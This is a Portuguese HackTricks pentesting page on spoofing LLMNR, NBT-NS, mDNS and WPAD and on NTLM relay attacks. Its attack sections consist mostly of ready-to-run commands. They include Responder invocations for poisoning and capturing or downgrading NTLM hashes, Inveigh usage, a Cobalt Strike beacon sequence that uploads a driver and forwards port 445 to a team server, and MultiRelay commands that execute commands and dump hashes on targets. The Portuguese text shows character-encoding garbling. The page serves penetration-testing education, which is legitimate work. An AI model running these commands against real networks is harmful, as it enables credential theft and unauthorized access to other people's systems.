# Spoofing LLMNR, NBT-NS, mDNS/DNS e WPAD e Ataques de Relevo

{% hint style="success" %}
Aprenda e pratique Hacking na AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**Treinamento HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Aprenda e pratique Hacking no GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**Treinamento HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Apoie o HackTricks</summary>

* Verifique os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
* **Junte-se ao** üí¨ [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe truques de hacking enviando PRs para os reposit√≥rios** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}

## Protocolos de Rede

### Protocolos de Resolu√ß√£o de Host Local
- **LLMNR, NBT-NS e mDNS**:
- A Microsoft e outros sistemas operacionais utilizam LLMNR e NBT-NS para resolu√ß√£o de nomes locais quando o DNS falha. Da mesma forma, os sistemas Apple e Linux utilizam mDNS.
- Esses protocolos s√£o suscet√≠veis a intercepta√ß√£o e spoofing devido √† sua natureza de difus√£o n√£o autenticada sobre UDP.
- O [Responder](https://github.com/lgandx/Responder) pode ser usado para se passar por servi√ßos enviando respostas falsificadas para hosts que consultam esses protocolos.
- Mais informa√ß√µes sobre a impersona√ß√£o de servi√ßos usando o Responder podem ser encontradas [aqui](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md).

### Protocolo de Descoberta Autom√°tica de Proxy da Web (WPAD)
- O WPAD permite que os navegadores descubram automaticamente as configura√ß√µes de proxy.
- A descoberta √© facilitada via DHCP, DNS, ou fallback para LLMNR e NBT-NS se o DNS falhar.
- O Responder pode automatizar ataques WPAD, direcionando clientes para servidores WPAD maliciosos.

### Responder para Envenenamento de Protocolo
- O **Responder** √© uma ferramenta usada para envenenar consultas LLMNR, NBT-NS e mDNS, respondendo seletivamente com base nos tipos de consulta, visando principalmente os servi√ßos SMB.
- Ele vem pr√©-instalado no Kali Linux, configur√°vel em `/etc/responder/Responder.conf`.
- O Responder exibe hashes capturados na tela e os salva no diret√≥rio `/usr/share/responder/logs`.
- Ele suporta tanto IPv4 quanto IPv6.
- A vers√£o do Windows do Responder est√° dispon√≠vel [aqui](https://github.com/lgandx/Responder-Windows).

#### Executando o Responder
- Para executar o Responder com as configura√ß√µes padr√£o: `responder -I <Interface>`
- Para sondagem mais agressiva (com potenciais efeitos colaterais): `responder -I <Interface> -P -r -v`
- T√©cnicas para capturar desafios/respostas NTLMv1 para facilitar a quebra: `responder -I <Interface> --lm --disable-ess`
- A impersona√ß√£o do WPAD pode ser ativada com: `responder -I <Interface> --wpad`
- As solicita√ß√µes NetBIOS podem ser resolvidas para o IP do atacante, e um proxy de autentica√ß√£o pode ser configurado: `responder.py -I <interface> -Pv`

### Envenenamento DHCP com Responder
- Falsificar respostas DHCP pode envenenar permanentemente as informa√ß√µes de roteamento de uma v√≠tima, oferecendo uma alternativa mais furtiva ao envenenamento ARP.
- Requer conhecimento preciso da configura√ß√£o da rede alvo.
- Executando o ataque: `./Responder.py -I eth0 -Pdv`
- Este m√©todo pode capturar efetivamente hashes NTLMv1/2, mas requer manuseio cuidadoso para evitar a interrup√ß√£o da rede.

### Capturando Credenciais com o Responder
- O Responder se passar√° por servi√ßos usando os protocolos mencionados acima, capturando credenciais (geralmente NTLMv2 Challenge/Response) quando um usu√°rio tenta autenticar-se contra os servi√ßos falsificados.
- Tentativas podem ser feitas para rebaixar para NetNTLMv1 ou desativar ESS para facilitar a quebra de credenciais.

√â crucial observar que a aplica√ß√£o dessas t√©cnicas deve ser feita de forma legal e √©tica, garantindo autoriza√ß√£o adequada e evitando interrup√ß√µes ou acessos n√£o autorizados.

## Inveigh

Inveigh √© uma ferramenta para testadores de penetra√ß√£o e equipes vermelhas, projetada para sistemas Windows. Oferece funcionalidades semelhantes ao Responder, realizando spoofing e ataques de homem-no-meio. A ferramenta evoluiu de um script PowerShell para um bin√°rio C#, com [**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) e [**InveighZero**](https://github.com/Kevin-Robertson/InveighZero) como as principais vers√µes. Par√¢metros e instru√ß√µes detalhadas podem ser encontrados na [**wiki**](https://github.com/Kevin-Robertson/Inveigh/wiki/Parameters).

Inveigh pode ser operado atrav√©s do PowerShell:
```powershell
Invoke-Inveigh -NBNS Y -ConsoleOutput Y -FileOutput Y
```
Ou executado como um bin√°rio C#:
```bash
Inveigh.exe
```
### Ataque de Relevo NTLM

Este ataque aproveita sess√µes de autentica√ß√£o SMB para acessar uma m√°quina alvo, concedendo um shell de sistema se bem-sucedido. Pr√©-requisitos principais incluem:
- O usu√°rio autenticado deve ter acesso de Administrador Local no host de retransmiss√£o.
- A assinatura SMB deve estar desativada.

#### Encaminhamento e Tunelamento da Porta 445

Em cen√°rios onde a introdu√ß√£o direta na rede n√£o √© vi√°vel, o tr√°fego na porta 445 precisa ser encaminhado e tunelado. Ferramentas como [**PortBender**](https://github.com/praetorian-inc/PortBender) ajudam a redirecionar o tr√°fego da porta 445 para outra porta, o que √© essencial quando o acesso de administrador local est√° dispon√≠vel para carregamento de driver.

Configura√ß√£o e opera√ß√£o do PortBender no Cobalt Strike:
```bash
Cobalt Strike -> Script Manager -> Load (Select PortBender.cna)

beacon> cd C:\Windows\system32\drivers # Navigate to drivers directory
beacon> upload C:\PortBender\WinDivert64.sys # Upload driver
beacon> PortBender redirect 445 8445 # Redirect traffic from port 445 to 8445
beacon> rportfwd 8445 127.0.0.1 445 # Route traffic from port 8445 to Team Server
beacon> socks 1080 # Establish a SOCKS proxy on port 1080

# Termination commands
beacon> jobs
beacon> jobkill 0
beacon> rportfwd stop 8445
beacon> socks stop
```
### Outras Ferramentas para Ataque de Revezamento NTLM

- **Metasploit**: Configurado com proxies, detalhes do host local e remoto.
- **smbrelayx**: Um script Python para rel√© de sess√µes SMB e execu√ß√£o de comandos ou implanta√ß√£o de backdoors.
- **MultiRelay**: Uma ferramenta da su√≠te Responder para rel√© de usu√°rios espec√≠ficos ou todos os usu√°rios, executar comandos ou extrair hashes.

Cada ferramenta pode ser configurada para operar atrav√©s de um proxy SOCKS, se necess√°rio, permitindo ataques mesmo com acesso de rede indireto.

### Opera√ß√£o do MultiRelay

O MultiRelay √© executado a partir do diret√≥rio _**/usr/share/responder/tools**_, visando IPs ou usu√°rios espec√≠ficos.
```bash
python MultiRelay.py -t <IP target> -u ALL # Relay all users
python MultiRelay.py -t <IP target> -u ALL -c whoami # Execute command
python MultiRelay.py -t <IP target> -u ALL -d # Dump hashes

# Proxychains for routing traffic
```
### For√ßar Logins NTLM

No Windows, **voc√™ pode ser capaz de for√ßar algumas contas privilegiadas a se autenticarem em m√°quinas arbitr√°rias**. Leia a seguinte p√°gina para aprender como:

{% content-ref url="../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md" %}
[printers-spooler-service-abuse.md](../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md)
{% endcontent-ref %}

## Refer√™ncias
* [https://intrinium.com/smb-relay-attack-tutorial/](https://intrinium.com/smb-relay-attack-tutorial/)
* [https://www.4armed.com/blog/llmnr-nbtns-poisoning-using-responder/](https://www.4armed.com/blog/llmnr-nbtns-poisoning-using-responder/)
* [https://www.notsosecure.com/pwning-with-responder-a-pentesters-guide/](https://www.notsosecure.com/pwning-with-responder-a-pentesters-guide/)
* [https://intrinium.com/smb-relay-attack-tutorial/](https://intrinium.com/smb-relay-attack-tutorial/)
* [https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html](https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html)


{% hint style="success" %}
Aprenda e pratique Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Aprenda e pratique Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Suporte ao HackTricks</summary>

* Verifique os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
* **Junte-se ao** üí¨ [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe truques de hacking enviando PRs para os reposit√≥rios** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}
